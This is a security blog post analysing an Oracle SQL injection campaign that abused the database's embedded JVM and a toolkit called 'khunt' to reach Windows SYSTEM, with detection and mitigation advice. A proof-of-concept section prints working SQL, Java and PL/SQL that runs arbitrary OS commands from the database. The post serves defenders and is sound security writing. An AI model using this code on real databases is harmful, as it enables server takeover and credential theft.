---
title: "Oracle SQL Injection Gains SYSTEM Access on Windows Servers"
description: "Analysis of a sophisticated SQL injection attack using Oracle's embedded JVM to gain full SYSTEM access on Windows. Learn to detect and mitigate this threat."
date: 2026-08-09T07:02:03Z
slug: "sophisticated-sql-injection-leverages-oracle"
tags: ["Oracle SQL injection", "Windows SYSTEM access", "database post-exploitation", "Oracle embedded JVM attack", "khunt toolkit", "database security", "secure coding practices", "least privilege principle"]
author: "BreachModal Intelligence"
image: "/images/sophisticated-sql-injection-leverages-oracle.png"
---

A standard SQL injection is no longer just a data theft risk; it is a direct path to total server compromise, with attackers now compiling and executing malware inside your Oracle database engine.

This is not theoretical. According to an investigation by cybersecurity firm [Huntress](https://www.huntress.com/blog/from-sql-injection-to-domain-control-a-story-of-a-highly-sophisticated-threat-actor), threat actors leveraged a classic SQL injection vulnerability in a public-facing Java application to gain SYSTEM-level access on the underlying Windows server. The attack chain weaponized a legitimate, albeit obscure, Oracle database feature: the ability to compile and run Java code directly within the database using `CREATE JAVA SOURCE`. This allowed the attackers to deploy a custom post-exploitation toolkit, dubbed "khunt," effectively turning the trusted database into a persistent command and control beachhead.

Note what this means: the line between application security and operating system security has been erased. By exploiting over-privileged database accounts, attackers can bypass Endpoint Detection and Response (EDR) and other host-based security controls entirely. The malicious activity occurs within the trusted process space of the Oracle database itself, a place where security tools have near-zero visibility. Why does this keep happening? Because organizations continue to treat the database as a simple data store, not the complex application server it truly is, and grant web applications god-like privileges out of convenience.


![An attack flow diagram illustrating the Oracle SQL injection to Windows SYSTEM access attack chain.](/images/sophisticated-sql-injection-leverages-oracle-visual-1.png)
*The attack chain bypasses traditional host defenses by weaponizing the database itself as an execution environment.*


## Anatomy of the Attack: From Injection to SYSTEM

The attack begins with a depressingly common vulnerability: a failure to validate user input. An autocomplete search field in a public-facing Java/Tomcat application allowed an attacker to append malicious SQL commands to a legitimate query. This is a textbook example of [SQL Injection (MITRE ATT&CK T1190)](https://attack.mitre.org/techniques/T1190/), a vulnerability class that has existed for over two decades yet remains pervasive.

The service account connecting the web application to the Oracle database was critically over-privileged. It possessed powerful permissions like `CREATE JAVA SOURCE` and `CREATE PROCEDURE`. Instead of exfiltrating data, the attackers used these permissions to escalate their access from the data layer to the operating system layer. They fed Java source code for their toolkit directly into the database through the SQLi vulnerability. The Oracle database, behaving as designed, dutifully compiled this malicious code into Java class objects stored within the database schema itself.

Once the toolkit was compiled, the attackers used PL/SQL wrappers—a type of stored procedure—to execute their new Java methods. This is a known, if rarely seen, technique for persistence and execution, cataloged by MITRE as [SQL Stored Procedures (T1505.001)](https://attack.mitre.org/techniques/T1505/001/). The result was arbitrary command execution on the underlying Windows server with the permissions of the Oracle service account, which is almost always the highly-coveted `NT AUTHORITY\SYSTEM`. This is the point of total compromise.

> 🧠 **CISO Brief:** Your application security team's failure to sanitize inputs just handed your infrastructure team's server to an attacker. This incident proves that AppSec and InfraSec cannot operate in silos. The database is the bridge between them, and if left unguarded, it becomes an attacker's superhighway.

The devastating effectiveness of this attack chain hinges entirely on the failure to enforce the principle of least privilege.

## The 'khunt' Toolkit: A Database-Native RAT

The post-exploitation toolkit deployed by the attackers, which Huntress named "khunt," was not a simple reverse shell. It was a multi-function remote access tool (RAT) living entirely within the Oracle database. This is a significant evolution from dropping binaries onto the filesystem where EDR might detect them.

Key components identified included:
*   **`KhuntCmd`**: The core execution module. It provided a mechanism to pass OS commands like `whoami` or `ipconfig` via SQL queries and receive the output.
*   **`KhuntHash`**: A credential harvester designed to query Oracle's internal `user$` table, extract usernames and password hashes, and write them to a file on the OS for offline cracking.
*   **`KhuntFS` and `KhuntFS2`**: A complete file explorer. These modules allowed the attackers to list directories, read sensitive files, search the filesystem, and check file sizes, all from their SQL command line.

If you were the CISO here, your logs would show a web application service account executing `CREATE JAVA` and then running unusual procedures. Your EDR would show nothing. The attackers used these tools to dump the SAM, SECURITY, and SYSTEM registry hives—a total credential compromise—before any traditional security tool flagged a malicious binary or a suspicious process tree. Oracle, in its infinite wisdom, provides a feature to compile and run Java directly in the database. Attackers, it turns out, read the manual.


![A security diagram showing how the Oracle SQL injection attack bypasses the EDR security layer.](/images/sophisticated-sql-injection-leverages-oracle-visual-2.png)
*Traditional EDR solutions lack visibility into database processes, making them blind to malicious code compiled and executed within Oracle's JVM.*


This database-native toolkit represents a stealthy and persistent foothold that is exceptionally difficult to detect without specialized database activity monitoring.

## Proof of Concept: Executing Commands via Oracle JVM

This section provides a technical, step-by-step walkthrough demonstrating how an attacker can leverage Oracle's embedded JVM to achieve OS command execution. This requires an account with `CREATE SESSION`, `CREATE PROCEDURE`, and `CREATE JAVA SOURCE` privileges.

1.  **Create the Malicious Java Source Object**

    First, the attacker uses a SQL command to create a Java source object within the database. This code defines a static method that takes a command as a string and executes it using `java.lang.Runtime.getRuntime().exec()`.

    ```sql
    CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "CmdRunner" AS
    import java.io.*;
    public class CmdRunner {
        public static String exec(String cmd) {
            try {
                BufferedReader reader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
                String line;
                String output = "";
                while ((line = reader.readLine()) != null) {
                    output = output + line + "\n";
                }
                return output;
            } catch (Exception e) {
                return e.toString();
            }
        }
    };
    /
    ```

2.  **Create a PL/SQL Wrapper Function**

    Next, the attacker creates a simple PL/SQL function to act as a wrapper. This makes the Java method easily callable from standard SQL.

    ```sql
    CREATE OR REPLACE FUNCTION cmd_exec(p_command IN VARCHAR2) RETURN VARCHAR2
    AS LANGUAGE JAVA
    NAME 'CmdRunner.exec(java.lang.String) return java.lang.String';
    /
    ```

3.  **Execute the OS Command**

    With the Java object and PL/SQL wrapper in place, the attacker can now execute arbitrary commands on the underlying server simply by calling their new function within a `SELECT` statement.

    ```sql
    set serveroutput on;
    select cmd_exec('whoami') from dual;
    ```

4.  **Observe the Output**

    The database returns the standard output of the executed command. If the Oracle service is running as SYSTEM, the output will be `nt authority\system`, confirming a complete server compromise.

> ⚠️ **BreachModal Insight:** The three commands above are all it takes to turn a database into an execution agent. These exact SQL statements, or variants thereof, should be immediate high-priority alerts in any SIEM or database activity monitoring solution. The presence of `CREATE JAVA SOURCE` from a web application account is a red flag that is already on fire.

## Mitigation is a Multi-Layered Mandate

Defending against this attack chain requires a security posture that does not end at the server's network interface. It must extend deep into the database configuration and application code.

*   **Enforce Least Privilege:** This is the most critical defense. Application service accounts must not have privileges like `CREATE JAVA SOURCE`, `CREATE PROCEDURE`, or any other DBA-level rights. Grant only `SELECT`, `INSERT`, `UPDATE`, `DELETE` on the specific tables the application requires. According to [Oracle's own documentation](https://docs.oracle.com/en/database/oracle/oracle-database/21/jjdev/Java-security.html), Java permissions should be tightly controlled.
*   **Eradicate SQL Injection:** This is non-negotiable. Mandate the use of parameterized queries (prepared statements) and input validation in all application code. This is not a new problem, and the solutions are well-documented. Failure to do this is negligence.
*   **Database Activity Monitoring (DAM):** Since EDR is blind to this activity, you need visibility inside the database. Monitor for and alert on the creation of new Java sources, stored procedures, or triggers, especially by low-privilege accounts. Specific object names like `KHUNT%` are indicators of compromise.
*   **Review Existing Objects:** An attacker may have already compromised your system. Regularly audit Oracle databases for suspicious Java classes or PL/SQL objects. Query the `ALL_OBJECTS` view for objects with `OBJECT_TYPE = 'JAVA SOURCE'` or `'JAVA CLASS'` and scrutinize their origin and purpose.

This attack is a potent reminder that a database is not a passive component of your infrastructure; it is an active and exploitable one.

## FINAL VERDICT

The exploitation of an Oracle SQL injection vulnerability to gain Windows SYSTEM access is the materialization of a long-theorized threat. It proves that the convergence of insecure application code and over-privileged database service accounts creates a fatal blind spot for most enterprise security monitoring programs. The risk is borne by any organization running a public-facing application backed by an Oracle database where security has been treated as an afterthought. To prevent this, the paradigm must shift: developers, DBAs, and security teams must collaboratively enforce a zero-trust model *within* the data tier, treating the application's service account with the same suspicion as an anonymous internet user.

**Is your database a blind spot? BreachModal's Adversarial Simulation and Penetration Testing services can identify and help you remediate these complex attack paths before they become a breach. [Contact us to secure your data tier.](/contact)**